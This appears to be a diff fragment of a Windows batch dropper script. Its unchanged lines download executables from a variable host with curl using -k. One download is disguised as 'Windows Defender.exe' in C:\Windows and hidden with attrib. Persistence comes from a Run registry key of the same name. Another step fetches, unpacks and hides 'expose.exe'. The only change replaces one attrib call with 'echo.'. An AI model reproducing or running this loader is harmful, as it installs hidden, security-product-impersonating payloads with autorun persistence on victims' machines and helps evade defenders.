@@ -5,7 +5,7 @@ attrib -s -h i "C:\Windows\curl.exe" && curl.exe -k %proxy% %host%/Tools/curl.ex
 attrib -s -h i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe" && REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 if exist "C:\Windows\expose.exe" (
-    attrib +s +h +i "C:\Windows\expose.exe"
+    echo.
 ) else (
   attrib -s -h -i "C:\Windows\expose.exe" && curl.exe -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\expose.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\expose.exe" && del "%temp%\expose.zip"
 )
